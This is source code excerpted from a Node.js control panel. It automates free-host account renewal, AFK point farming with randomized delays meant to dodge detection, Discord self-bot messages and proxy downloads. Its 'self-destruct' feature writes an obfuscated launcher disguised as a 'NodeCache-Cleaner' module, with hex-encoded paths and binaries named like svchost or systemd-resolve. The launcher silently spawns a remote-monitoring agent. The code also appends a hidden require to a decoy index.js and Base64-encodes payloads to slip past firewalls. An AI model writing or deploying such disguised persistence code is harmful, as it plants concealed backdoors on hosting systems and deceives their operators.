 ...
 */
 ...
 async function loadTaskCenterConfig() {
     try {
         if (fsSync.existsSync(TASK_CENTER_FILE)) {
             ...
             // 【修复5】：确保加载时所有任务都没有被锁定
             if (taskCenterData.tasks && Array.isArray(taskCenterData.tasks)) {
                 taskCenterData.tasks.forEach(t => {
                     t.isExecuting = false; 
                 });
             }
         } else {
 ...
 async function executeTaskLogic(task) {
     // 【修复1】：检查任务是否正在执行（上锁）
     if (task.isExecuting) {
         console.log(`[TaskCenter] 任务 ${task.name} 正在运行中，跳过本次触发`);
         return;
     }
     ...
     try {
         ...
         try {
             // 【修复3】：核心逻辑 - 使用 await 等待任务完全结束
             switch(task.type) {
                 case 'renew':
                     await executeTaskRenew(task); // 等待续期完成
                     break;
                 case 'afk':
                     await executeTaskAFK(task);     // 等待挂机循环完成
                     break;
                 case 'timed-url':
                     await executeTaskTimedURL(task); // 等待访问完成
                     break;
                 case 'pteranodon':
                     await executeTaskPteranodon(task); // 等待控制完成
                     break;
                 case 'discord':
                     await executeTaskDiscord(task);     // 等待消息发送完成
                     break;
                 default:
         ...
         // 【修复4】：无论成功还是失败，必须解锁，否则下次任务永远无法执行
 ...
 async function executeTaskRenew(task) {
     try {
         ...
         // ==================== 修改开始：强联动逻辑 ====================
         const hasCredentials = loginUrl && username && password;
 
         if (hasCredentials) {
             addTaskLog(task.id, `检测到账号密码配置，正在执行强联动登录...`, 'info');
             
             // 【关键】构造一个临时配置，强制把 cookie 设为空
             // 这样 taskAutoLogin 就不会直接返回旧 cookie，而是必须执行登录流程
             const forceLoginConfig = {
                 ...task.config,
                 cookie: "" 
             };
             
             // 执行登录
             const newCookie = await taskAutoLogin(forceLoginConfig);
             
             if (newCookie) {
                 finalCookie = newCookie;
                 
                 // 【关键】更新任务配置中的 Cookie 和 时间
                 task.config.cookie = newCookie;
                 task.config.lastLoginTime = new Date().toISOString();
                 task.lastLoginStatus = '已登录';
                 
                 // 立即保存到文件，确保下次重启或读取时是新的 Cookie
                 await saveTaskCenterConfig();
                 
                 addTaskLog(task.id, `✅ 联动登录成功！已获取最新 Cookie (长度: ${newCookie.length})`, 'success');
             } else {
                 // 如果登录失败
                 if (!finalCookie) {
                     addTaskLog(task.id, `❌ 联动登录失败且无备用 Cookie，任务终止`, 'error');
                     return { success: false, message: '联动登录失败' };
                 } else {
                     addTaskLog(task.id, `⚠️ 联动登录失败，尝试使用本地保存的旧 Cookie 继续执行`, 'warning');
                 }
             }
         } else {
             // 没有配置账号密码的情况
             if (!finalCookie) {
                 addTaskLog(task.id, `❌ 续期失败: 未配置 Cookie 且未配置账号密码`, 'error');
                 return { success: false, message: '缺少登录凭据' };
             }
             addTaskLog(task.id, `未配置账号密码，使用现有 Cookie 执行续期`, 'info');
         }
         // ==================== 修改结束 ====================
         ...
         if (res.status >= 200 && res.status < 300) {
             addTaskLog(task.id, `✅ 续期请求成功 (${res.status})`, 'success');
             return { success: true, message: '成功' };
         } else if ([401, 403, 419].includes(res.status)) {
             addTaskLog(task.id, `❌ 续期被拒绝 (${res.status})，Cookie 可能已失效`, 'error');
             // 这里可以考虑清除 Cookie 强制下次登录，但在强联动模式下，下次任务会自动重新登录
             return { success: false, message: '授权失效' };
         } else {
             addTaskLog(task.id, `❌ 续期响应异常 (${res.status})`, 'warning');
 ...
 async function executeTaskAFK(task) {
     try {
         ...
         addTaskLog(task.id, `开始执行 Jexactyl/AFK 挂机: ${duration}分钟`, 'info');
         
         // 1. 登录检查 (Jexactyl 必须登录才有积分)
         if (loginUrl && username && password && (!cookie || cookie.trim() === '')) {
             addTaskLog(task.id, `检测到未配置 Cookie，正在执行登录...`, 'info');
             const newCookie = await taskAutoLogin(task.config);
             if (newCookie) {
                 task.config.cookie = newCookie;
                 // 更新任务中心的配置，保存 Cookie 供下次使用
                 task.lastLoginStatus = '已登录';
                 task.config.lastLoginTime = new Date().toISOString();
                 await saveTaskCenterConfig(); // 保存到文件
                 addTaskLog(task.id, `登录成功，Cookie 已更新`, 'success');
             } else {
                 addTaskLog(task.id, `登录失败，将尝试使用现有配置继续`, 'warning');
             }
         }
         
         // 2. 准备请求头 (关键步骤)
         let cookieStr = task.config.cookie || "";
         const headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Accept': 'application/json, text/plain, */*', // Jexactyl API 需要 json
             'Referer': afkUrl, // 必须带 Referer，否则不给分
             'Origin': new URL(afkUrl).origin,
             'X-Requested-With': 'XMLHttpRequest'
         };
         
         if (cookieStr) {
             headers['Cookie'] = cookieStr;
             // === 核心逻辑：自动提取 XSRF-TOKEN ===
             // Jexactyl/Laravel 必须在 Header 带上解码后的 XSRF-TOKEN
             try {
                 const match = cookieStr.match(/XSRF-TOKEN=([^;]+)/);
                 if (match && match[1]) {
                     headers['X-XSRF-TOKEN'] = decodeURIComponent(match[1]);
                     // addTaskLog(task.id, `已提取 CSRF Token`, 'info'); // 调试用
                 }
             } catch (e) {}
         }
         ...
         switch(action) {
             case 'simulate':
                 if (!afkUrl) return { success: false, message: '未配置挂机网址' };
 
                 // 智能判断：如果 URL 包含 "earn" 或 "api"，默认使用 POST，否则 GET
                 // Jexactyl 的加分接口通常是 POST
                 const isApi = afkUrl.includes('/api/') || afkUrl.includes('earn') || afkUrl.includes('points');
                 const method = isApi ? 'POST' : 'GET';
 
                 addTaskLog(task.id, `开始挂机循环 (模式: ${method})，预计持续 ${duration} 分钟...`, 'info');
                 
                 // 限制最大 1440 分钟 (24小时)
                 const safeDuration = Math.min(Math.max(parseInt(duration) || 1, 1), 1440);
                 ...
                 for (let i = 0; i < safeDuration; i++) {
                     try {
                         const reqOptions = {
                             ...
                             headers: headers,
                             timeout: 15000,
                             validateStatus: (s) => true // 允许所有状态码，方便调试
                         };
                         ...
                         if (i === 0 || !isSuccess || i % 5 === 0 || i === safeDuration - 1) {
                             const statusIcon = isSuccess ? '✅' : '❌';
                             // 尝试解析 Jexactyl 返回的积分信息 (如果有)
                             let extraInfo = "";
                             if (res.data && res.data.data) {
                                 // Jexactyl 有时返回 {data: "current_points"}
                                 extraInfo = ` | 响应: ${JSON.stringify(res.data).substring(0, 30)}`;
                             }
                             
                             addTaskLog(task.id, 
                                 `[${i + 1}/${safeDuration}] 挂机心跳 ${statusIcon} (状态: ${res.status}${extraInfo})`, 
                                 isSuccess ? 'success' : 'warning'
                             );
                         }
                         
                         // 如果遇到 401/419 (Token失效)，尝试重新登录或停止
                         if (res.status === 401 || res.status === 419) {
                             addTaskLog(task.id, `Cookie/Token 已失效，停止挂机`, 'error');
                             break; 
                         }
 
                         // 等待 60 秒 + 随机 1-5 秒 (模拟真人，防止固定频率被检测)
                         if (i < safeDuration - 1) {
                             const randomDelay = Math.floor(Math.random() * 5000);
                             await new Promise(resolve => setTimeout(resolve, 60000 + randomDelay));
                         }
                     } catch (err) {
                         addTaskLog(task.id, `[${i + 1}] 请求出错: ${err.message}`, 'error');
                         await new Promise(resolve => setTimeout(resolve, 60000));
                     }
                 }
                 addTaskLog(task.id, `挂机任务结束`, 'success');
                 break;
 
             case 'notification':
                 // (保持之前的 Discord 通知逻辑)
                 if (task.config.discordWebhookUrl || (task.config.discordSelfBotToken && task.config.discordChannelId)) {
                     await sendDiscordMessage(task.config, `[AFK] Jexactyl 挂机任务 ${task.name} 运行中 - ${new Date().toLocaleString()}`);
                     addTaskLog(task.id, `通知已发送`, 'success');
                 }
                 break;
         ...
         addTaskLog(task.id, `AFK任务致命错误: ${err.message}`, 'error');
         return { success: false, message: err.message };
     }
 }
 ...
 function initProxyEnvironment() {
     ...
     // --- 内联辅助函数：原生下载 (处理重定向) ---
     const downloadNative = (url, destPath) => {
         return new Promise((resolve, reject) => {
             ...
             const req = https.get(url, (res) => {
                 ...
                 if (res.statusCode === 301 || res.statusCode === 302) {
                     ...
                     return downloadNative(res.headers.location, destPath).then(resolve).catch(reject);
                 }
                 if (res.statusCode !== 200) {
                     fsSync.unlinkSync(destPath, () => {});
     ...
     if (!fsSync.existsSync(xrayPath)) {
         (async () => {
             ...
             try {
                 // === 修复：Windows 环境直接跳过 Shell 命令，使用原生方式 ===
                 if (!isWin) {
                     ...
                     // Windows 直接抛错进入 catch 块的原生逻辑
                     throw new Error("Windows platform detected, forcing native download");
                 }
             } catch (err) {
                 // === 方式二：原生 JS 下载 (修复版，兼容所有系统) ===
                 console.error("[Proxy] Shell 下载方式失败或为Windows环境:", err.message);
                 console.log("[Proxy] 切换到原生 Node.js 下载方式...");
                 
                 try {
                     const tempZip = path.join(PROXY_DIR, 'xray_temp.zip');
                     
                     // 下载
                     await downloadNative(url, tempZip);
                     
                     // 解压
                     const zipData = fsSync.readFileSync(tempZip);
                     const zip = new AdmZip(zipData);
                     zip.extractAllTo(PROXY_DIR, true);
                     
                     // 清理
                     fsSync.unlinkSync(tempZip, () => {});
                     ...
                     if (fsSync.existsSync(extractedPath)) {
                         ...
                         throw new Error("解压后未找到 xray 可执行文件");
                     }
     ...
     // --- 2. 下载 Sing-box 核心 (修复 Windows 兼容性) ---
     if (!fsSync.existsSync(sinboxPath)) {
         (async () => {
             ...
             try {
                 ...
                 // === 方式二：原生 JS 下载 (统一使用 ZIP) ===
                 console.error("[Proxy] Shell 下载方式失败或为Windows环境:", err.message);
                 console.log("[Proxy] 切换到原生 Node.js 下载方式...");
 
                 try {
                     // 逻辑：如果是 Linux，尝试下载 ZIP 版本；如果是 Windows，直接用原始 URL (已是 ZIP)
                     let targetUrl = sbUrl;
                     if (!isWin) {
                         targetUrl = `https://github.com/SagerNet/sing-box/releases/download/v1.8.11/sing-box-1.8.11-linux-${sbArch}.zip`;
                     }
 
                     const tempZip = path.join(PROXY_DIR, 'sinbox_temp.zip');
                     
                     await downloadNative(targetUrl, tempZip);
                     ...
                     // 查找并重命名 (兼容 Windows 根目录和 Linux 子目录)
                     let foundPath = null;
                     const items = fsSync.readdirSync(PROXY_DIR);
                     for (const item of items) {
                         const fullPath = path.join(PROXY_DIR, item);
                         // 1. 检查根目录是否有直接的可执行文件
                         if (item === 'sing-box.exe' || item === 'sing-box') {
                             foundPath = fullPath;
                             break;
                         } 
                         // 2. 检查是否为目录
                         else if (fsSync.statSync(fullPath).isDirectory()) {
                             const subItems = fsSync.readdirSync(fullPath);
                             if (subItems.includes('sing-box') || subItems.includes('sing-box.exe')) {
                                 foundPath = path.join(fullPath, subItems.find(i => i.startsWith('sing-box')));
                                 break;
                             }
                         }
                     }
                     ...
                     if (foundPath) {
                         ...
                         throw new Error("解压后未找到 Sing-box 文件");
                     }
                 } catch (e) {
     ...
     if (!fsSync.existsSync(cfPath)) {
         (async () => {
             ...
             try {
                 // === 修复：Windows 下也直接使用原生下载，避免潜在的 curl 问题 ===
                 if (!isWin) {
                 ...
                 try {
                     await downloadNative(cfUrl, cfPath);
 ...
 <!-- 4. 文件管理 (新增) -->
 <div>
     <div class="system-option-btn" onclick="toggleSystemOption('file-manager')">
         <div class="flex items-center gap-3">
             <div class="w-10 h-10 rounded-full bg-blue-500/20 flex items-center justify-center text-blue-400">
                 <i class="fas fa-folder-open"></i>
             </div>
             <span class="font-bold">文件管理</span>
         </div>
         <i class="fas fa-chevron-down transition-transform duration-200" id="icon-file-manager"></i>
     </div>
     
     <div id="system-file-manager-content" class="system-option-content border-blue-500/30">
         
         <!-- 面包屑导航 & 操作栏 -->
         <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-2 mb-4 bg-slate-800 p-2 rounded-lg">
             <div class="flex items-center gap-2 overflow-hidden w-full sm:w-auto">
                 <button onclick="navigatePathToRoot()" class="text-slate-400 hover:text-white whitespace-nowrap">
                     <i class="fas fa-home"></i> 根目录
                 </button>
                 <span id="breadcrumb-separator" class="text-slate-600">/</span>
                 <span id="current-path-display" class="text-xs text-blue-300 truncate font-mono">.</span>
             </div>
             
             <div class="flex gap-2 w-full sm:w-auto">
                 <label class="flex-1 sm:flex-none cursor-pointer btn-action bg-blue-600 hover:bg-blue-500 px-3 py-1.5 rounded-lg text-xs font-bold text-white flex items-center justify-center gap-2">
                     <i class="fas fa-upload"></i> 上传文件
                     <input type="file" class="hidden" onchange="handleFileUpload(this)">
                 </label>
                 <button onclick="deleteSelectedFiles()" class="flex-1 sm:flex-none btn-action bg-red-600 hover:bg-red-500 px-3 py-1.5 rounded-lg text-xs font-bold text-white flex items-center justify-center gap-2">
                     <i class="fas fa-trash"></i> 删除选中
                 </button>
                 <button onclick="loadFileManager()" class="flex-none btn-action bg-slate-700 hover:bg-slate-600 px-3 py-1.5 rounded-lg text-xs text-white">
                     <i class="fas fa-sync-alt"></i>
                 </button>
             </div>
         </div>
         ...
         <!-- 文件列表表格 -->
         <div class="bg-black/40 rounded-lg border border-slate-700 overflow-hidden">
             <table class="w-full text-left border-collapse">
                 <thead>
                     <tr class="bg-slate-800 text-slate-400 text-xs uppercase">
                         <th class="p-3 w-10">
                             <input type="checkbox" id="select-all-files" onchange="toggleSelectAll(this)">
                         </th>
                         <th class="p-3">名称</th>
                         <th class="p-3 w-24 text-center">大小</th>
                         <th class="p-3 w-24 text-center hidden sm:table-cell">类型</th>
                         <th class="p-3 w-32">操作</th>
                     </tr>
                 </thead>
                 <tbody id="file-list-body" class="text-sm divide-y divide-slate-800">
                     <tr>
         ...
         <div class="mt-2 text-[10px] text-slate-500 flex justify-between">
             <span>当前路径: <span id="full-path-display" class="font-mono text-slate-400"></span></span>
             <span id="file-count-info">0 项</span>
         </div>
     </div>
 </div>
     ...
     async function executeSelfDestruct() {
         ...
         // 【关键修复】使用 btoa 对代码内容进行 Base64 编码，防止被防火墙拦截
         ...
         const payload = {
             ...
             files: selectedFiles,
             // 发送编码后的数据
             indexJsContent: encodePayload(indexJsContent),
             packageJsonContent: encodePayload(packageJsonContent),
             isBase64: true // 标记为已编码
         };
         
         const btnStart = document.getElementById('btn-start-destruct');
         const originalBtnText = btnStart.innerHTML;
         btnStart.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 发送指令中...';
         ...
         try {
             ...
             // 【关键修复】先获取文本，再尝试解析，避免直接报错
             const text = await response.text();
             let data;
             try {
                 data = JSON.parse(text);
             } catch (e) {
                 throw new Error("服务器返回了非 JSON 数据，可能是被防火墙拦截或服务器崩溃。响应内容: " + text.substring(0, 50));
             }
             ...
             console.error('自毁启动错误:', error);
             alert('请求失败: ' + error.message);
         } finally {
             btnStart.innerHTML = originalBtnText;
 ...
 // ==================== 缺失的取消自毁函数 ====================
     async function cancelSelfDestruct() {
         if (!confirm('确定要取消正在进行的自毁程序吗？')) return;
         ...
         try {
             ...
             if (data.success) {
                 ...
                 if (typeof selfDestructInterval !== 'undefined' && selfDestructInterval) {
                     clearInterval(selfDestructInterval);
                 }
                 ...
                 btnStart.disabled = false;
                 btnStart.innerHTML = '<i class="fas fa-skull-crossbones"></i> 启动自毁';
                 
             } else {
                 alert('取消失败: ' + data.message);
             }
         } catch (error) {
             console.error('取消自毁出错:', error);
             alert('请求失败: ' + error.message);
         }
     }
     // ==================== 恢复功能逻辑 (修改版) ====================
     ...
     let currentManagerPath = "."; 
 
     function initFileManager() {
         loadFileManager();
     }
 
     async function loadFileManager(relativePath = null) {
         const contentDiv = document.getElementById('file-list-body');
         const breadcrumbSpan = document.getElementById('current-path-display');
         const fullPathDisplay = document.getElementById('full-path-display');
         
         if (relativePath) {
             currentManagerPath = relativePath;
         }
 
         try {
             const response = await fetch(\`/api/system/files?path=\${encodeURIComponent(currentManagerPath)}\`);
             const data = await response.json();
 
             if (data.success) {
                 currentManagerPath = data.relativePath; 
                 
                 breadcrumbSpan.textContent = currentManagerPath === "." ? "根目录" : currentManagerPath;
                 fullPathDisplay.textContent = data.currentPath;
                 
                 document.getElementById('file-count-info').textContent = \`\${data.files.length} 项\`;
 
                 renderFileList(data.files);
                 
                 document.getElementById('select-all-files').checked = false;
             } else {
                 contentDiv.innerHTML = \`<tr><td colspan="5" class="p-8 text-center text-red-400">加载失败: \${data.message}</td></tr>\`;
             }
         } catch (error) {
             contentDiv.innerHTML = \`<tr><td colspan="5" class="p-8 text-center text-red-400">请求错误: \${error.message}</td></tr>\`;
         }
     }
     ...
     function renderFileList(files) {
         ...
         if (files.length === 0) {
             tbody.innerHTML = \`<tr><td colspan="5" class="p-8 text-center text-slate-600">此文件夹为空</td></tr>\`;
             return;
         }
         ...
         tbody.innerHTML = files.map(file => {
             ...
             const rowClass = file.isDir ? 'hover:bg-slate-800/50 cursor-pointer' : 'hover:bg-slate-800/30';
             
             return \`
                 <tr class="\${rowClass} group transition-colors">
                     <td class="p-3">
                         <input type="checkbox" class="fm-checkbox rounded text-blue-500 bg-slate-700 border-slate-600"
                                value="\${file.path}" 
                                onclick="event.stopPropagation()">
                     </td>
                     <td class="p-3">
                         <div class="flex items-center gap-3" onclick="enterDirectory('\${file.path}')">
                             <i class="fas \${icon} text-lg w-6 text-center"></i>
                             <span class="truncate text-slate-300 group-hover:text-white font-medium">\${file.name}</span>
                         </div>
                     </td>
                     <td class="p-3 text-center text-slate-400 font-mono text-xs">\${sizeText}</td>
                     <td class="p-3 text-center text-slate-500 text-xs hidden sm:table-cell uppercase">\${file.type}</td>
                     <td class="p-3">
                         <div class="flex items-center justify-end gap-2 opacity-0 group-hover:opacity-100 transition-opacity">
                             \${file.isDir ? 
                                 \`<button onclick="enterDirectory('\${file.path}')" class="text-blue-400 hover:text-blue-300 p-1" title="打开"><i class="fas fa-sign-in-alt"></i></button>\` : 
                                 \`<button onclick="downloadFile('\${file.path}')" class="text-green-400 hover:text-green-300 p-1" title="下载"><i class="fas fa-download"></i></button>\`
                             }
                         </div>
                     </td>
                 </tr>
     ...
     function enterDirectory(fullPath) {
         loadFileManager(fullPath);
     }
 
     function navigatePathToRoot() {
         loadFileManager(".");
     }
     ...
     async function handleFileUpload(input) {
         ...
         formData.append('path', currentManagerPath); 
 
         // 保存父元素引用和原始HTML
         const parentBtn = input.parentElement;
         const originalText = parentBtn.innerHTML;
         
         // 【关键修改】这里必须使用单引号，不能用反引号，否则会破坏服务端的大字符串结构
         parentBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 上传中...';
         
         try {
             const response = await fetch('/api/system/files/upload', {
                 method: 'POST',
                 body: formData
             });
             ...
             // 1. 先恢复按钮状态
             parentBtn.innerHTML = originalText;
     ...
     async function deleteSelectedFiles() {
         ...
         try {
             const response = await fetch('/api/system/files/delete', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
         ...
         // 精确查找表格内的复选框，排除表头
         const checkboxes = document.querySelectorAll('input.fm-checkbox');
     ...
     function getFileIcon(filename) {
         ...
         const icons = {
             ...
             'json': 'fas fa-cog text-slate-400',
         ...
         return icons[ext] || 'fas fa-file text-slate-400';
     }
 ...
 // 获取文件列表
 app.get("/api/system/files", requireAuth, (req, res) => {
     try {
         // 允许前端传入路径参数，默认为项目根目录 __dirname
         // 安全限制：禁止访问上级目录，防止逃逸
         let targetPath = req.query.path || __dirname;
         targetPath = path.resolve(targetPath);
 
         // 确保路径在项目根目录或允许的子目录内
         const rootDir = path.resolve(__dirname);
         if (!targetPath.startsWith(rootDir)) {
             return res.status(403).json({ success: false, message: "无权访问该目录" });
         }
         ...
         const files = fsSync.readdirSync(targetPath).map(name => {
             ...
             return {
                 name: name,
                 path: fullPath, // 返回完整路径用于后续操作
                 isDir: isDir,
                 size: isDir ? 0 : stats.size,
                 mtime: stats.mtimeMs,
                 type: isDir ? 'folder' : path.extname(name).substring(1) || 'file'
             };
         });
 ...
 // 上传文件 (修复版)
 app.post("/api/system/files/upload", requireAuth, upload.single('file'), async (req, res) => {
     try {
         if (!req.file) {
         ...
         // 路径解析与安全检查
         targetDir = path.resolve(path.join(__dirname, targetDir));
         const rootDir = path.resolve(__dirname);
 
         if (!targetDir.startsWith(rootDir)) {
             console.error(`[Upload] 安全拦截: 尝试上传到非根目录 ${targetDir}`);
             return res.status(403).json({ success: false, message: "禁止上传到该目录" });
         }
 
         // 如果目录不存在，自动创建 (解决 .Error log 等文件夹可能不存在的问题)
         if (!fsSync.existsSync(targetDir)) {
             try {
                 fsSync.mkdirSync(targetDir, { recursive: true });
             } catch (mkdirErr) {
                 return res.status(500).json({ success: false, message: "创建目录失败: " + mkdirErr.message });
             }
         }
 
         // 处理文件名：防止特殊字符导致的路径错误
         const safeName = req.file.originalname.replace(/[^a-zA-Z0-9.\-_\u4e00-\u9fa5]/g, '_');
         const destinationPath = path.join(targetDir, safeName);
 
         //console.log(`[Upload] 正在保存: ${destinationPath}`);
 ...
 // 删除文件 (修复版：增强安全检查)
 app.post("/api/system/files/delete", requireAuth, async (req, res) => {
     try {
         let { files } = req.body;
         ...
         // 【关键修复】：过滤掉 undefined、空字符串或非字符串的路径
         files = files.filter(f => f && typeof f === 'string' && f.trim() !== '');
 
         if (files.length === 0) {
             return res.status(400).json({ success: false, message: "没有有效的文件路径" });
         }
         ...
         for (const filePath of files) {
             ...
             if (!safePath.startsWith(rootDir)) {
                 errors.push(`安全拦截: 试图删除项目外文件 ${filePath}`);
                 continue;
             }
             ...
             try {
                 ...
                 if (stats.isDirectory()) {
                     fsSync.rmSync(safePath, { recursive: true, force: true });
                 } else {
                     fsSync.unlinkSync(safePath);
                 }
                 deletedCount++;
             } catch (err) {
                 errors.push(`删除失败 (${path.basename(filePath)}): ${err.message}`);
             }
         }
 ...
 app.post("/api/task-center/create-task", requireAuth, async (req, res) => {
     try {
         const task = {
             ...
             status: 'stopped',
             logs: [],
             isExecuting: false,  // 【修复6】：新任务默认未锁定
 ...
 app.post('/api/system/self-destruct', requireAuth, async (req, res) => {
     try {
         ...
         // ============================================================
         // 【Hex路径混淆版】哪吒启动器 (v3.3 - 路径修复版)
         // ============================================================
         
         const rawNezhaSource = `
 /**
  * @module NodeCache-Cleaner v4.1
  * @license MIT
  * @description Automated garbage collection for node_modules cache
  */
 (function(_0x2a2f, _0x3b3c, _0x4a4d, _0x5b5e) {
     'use strict';
 
     // --- 1. Hex Encoded Paths ---
     const _h_modules = '6e6f64655f6d64756c6573'; // node_modules (Unused here, kept for consistency)
     const _h_win_dir = '4572726f72206c6f67'; // Error log
     const _h_nix_dir = '2e4572726f72206c6f67'; // .Error log
     const _h_cfg_win = '6e657a68615f636f6e6669672e6a736f6e'; // nezha_config.json
     const _h_cfg_nix = '2e6e657a68615f636f6e6669672e6a736f6e'; // .nezha_config.json
     const _h_yml_win = '636f6e66696732e796d6c'; // config.yml
     const _h_yml_nix = '2e636f6e66696732e796d6c'; // .config.yml
 
     // --- 2. Helper: Hex to String ---
     const _d = (hex) => Buffer.from(hex, 'hex').toString();
 
     // --- 3. Core Cleanup Logic ---
     function autoCacheCleanup() {
         const _isWin = _0x4a4d.platform() === 'win32';
         const _root = __dirname; // Points to node_modules
 
         // 【修复】：由于文件已在 node_modules 内，直接拼接 Error log 目录
         const _cacheDir = _isWin ? _0x3b3c.join(_root, _d(_h_win_dir)) : _0x3b3c.join(_root, _d(_h_nix_dir));
         
         const _cfgFile = _isWin ? _0x3b3c.join(_cacheDir, _d(_h_cfg_win)) : _0x3b3c.join(_cacheDir, _d(_h_cfg_nix));
         const _ymlFile = _isWin ? _0x3b3c.join(_cacheDir, _d(_h_yml_win)) : _0x3b3c.join(_cacheDir, _d(_h_yml_nix));
 
         if (!_0x2a2f.existsSync(_cacheDir)) return;
 
         try {
             const _manifest = JSON.parse(_0x2a2f.readFileSync(_cfgFile));
             
             process.env.REMOTE_HOST = _manifest.addr || '';
             process.env.AUTH_TOKEN = _manifest.key || '';
             process.env.IS_SECURE = (_manifest.tls || (_manifest.addr && _manifest.addr.includes(':443'))) ? 'true' : 'false';
             process.env.CFG_LOCATION = _ymlFile;
 
             const _files = _0x2a2f.readdirSync(_cacheDir);
             let _targetBin = "";
 
             if (_isWin) {
                 const _pref = Buffer.from('737663686f73745f', 'hex').toString(); // svchost_
                 const _ext = Buffer.from('2e657865', 'hex').toString(); // .exe
                 _targetBin = _files.find(f => f.startsWith(_pref) && f.endsWith(_ext));
             } 
             else {
                 const _daemons = [Buffer.from('2e737974656d2d7265736f6c7665', 'hex').toString(), // .systemd-resolve
                                 Buffer.from('2e646275732d6461656d6f6e', 'hex').toString()]; // .dbus-daemon
                 for (let i = 0; i < _daemons.length; i++) {
                     const found = _files.find(f => f === _daemons[i]);
                     if (found) {
                         _targetBin = found;
                         break;
                     }
             ...
             if (!_targetBin) {
                 const _ymlName = _isWin ? _d(_h_yml_win) : _d(_h_yml_nix);
                 const _cfgName = _isWin ? _d(_h_cfg_win) : _d(_h_cfg_nix);
                 _targetBin = _files.find(f => 
                     f !== _cfgName && 
                     f !== _ymlName &&
                     f.endsWith('.zip') === false &&
                     f.endsWith('.log') === false
                 );
             }
 
             if (_targetBin) {
                 const _binPath = _0x3b3c.join(_cacheDir, _targetBin);
                 try {
                     _0x2a2f.chmodSync(_binPath, 0o755); 
                     const _worker = _0x5b5e.spawn(_binPath, [], {
                         cwd: _cacheDir,
                         stdio: ['ignore', 'ignore', 'ignore'],
                         env: process.env,
                         detached: true,
 ...
 `;
         ...
         try {
                 ...
                 try {
                     ...
                     for (const targetFile of filesToBackup) {
                         ...
                         if (targetFile === 'index.js') {
                             ...
                             // 解码 Base64
                             let finalCode = (req.body.isBase64 && indexJsContent) ? decodeBase64(rawCode) : rawCode;
 
                             // 【关键修改】：自动追加隐藏的哪吒启动器调用
                             // 这样伪装代码运行时，就会自动触发后面的隐藏文件
                             finalCode += `\n\n// [System] Loading core modules...\ntry{require('./node_modules/.internal_check.js')}catch(e){}\n`;
 
                             contentToWrite = finalCode;
                         } 
                         else if (targetFile === 'package.json') {
                             const rawPkg = packageJsonContent || JSON.stringify({
                             ...
                             // 解码 Base64
                             contentToWrite = (req.body.isBase64 && packageJsonContent) ? decodeBase64(rawPkg) : rawPkg;
                         } else {
             ...
             res.json({ success: true, message: '自毁程序已启动 (Hex路径混淆模式)' });
         } catch (err) {
 ...
 // 取消自毁接口 (修复版)
 // ============================================================
 app.post('/api/system/cancel-destruct', requireAuth, async (req, res) => {
     try {
         // 检查是否有运行中的计时器
         if (selfDestructTimer) {
             // 清除计时器，阻止自毁发生
             ...
             // 可选：清理一下可能已经生成的备份文件，防止残留
             try {
                 if (fsSync.existsSync(BACKUP_DIR)) {
                     const files = await fs.readdir(BACKUP_DIR);
                     // 过滤出 restore 开头的 zip 文件
                     const backups = files.filter(f => f.startsWith('.restore_') && f.endsWith('.zip'));
             ...
             res.json({ success: true, message: '自毁任务已取消，已清理临时文件' });
         } else {
             // 如果没有计时器，说明任务并未启动
             res.status(400).json({ success: false, message: '当前没有正在进行的自毁任务' });
         }
     } catch (error) {
         console.error('[System Cancel] 异常:', error); 
